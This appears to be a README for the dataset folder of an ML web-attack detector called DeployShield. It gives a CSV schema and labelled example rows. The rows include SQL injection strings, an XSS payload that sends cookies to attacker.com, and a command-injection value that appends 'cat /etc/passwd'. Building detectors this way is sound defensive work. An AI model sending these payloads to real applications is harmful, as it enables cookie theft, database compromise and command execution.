# DeployShield ML Dataset Directory

Place your dataset file (`dataset.csv` or any `.csv` file) in this directory before running `python train.py`.

## Expected CSV Dataset Schema

The dataset should be a UTF-8 encoded CSV file containing the following columns:

| Column Name | Type   | Description | Example Value |
| :---        | :---   | :---        | :---          |
| `method`    | String | HTTP Request Method | `GET`, `POST`, `PUT`, `DELETE` |
| `url`       | String | Full requested URI path and query string | `/login?user=' OR 1=1 --` |
| `headers`   | String | JSON string or raw header key-value representations | `{"user-agent": "sqlmap/1.5"}` |
| `body`      | String | Request body payload content (or empty string) | `<script>alert(1)</script>` |
| `label`     | String | Target classification label | `benign`, `sqli`, `xss`, `cmd_injection` |

## Example CSV Rows

```csv
method,url,headers,body,label
GET,/products?id=10,{"user-agent":"Mozilla/5.0"},,benign
GET,/login?user=' UNION SELECT 1,2,3--,{"user-agent":"curl/7.68.0"},,sqli
POST,/comments,{"content-type":"application/json"},"<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",xss
POST,/ping,{"content-type":"application/x-www-form-urlencoded"},"host=8.8.8.8; cat /etc/passwd",cmd_injection
```
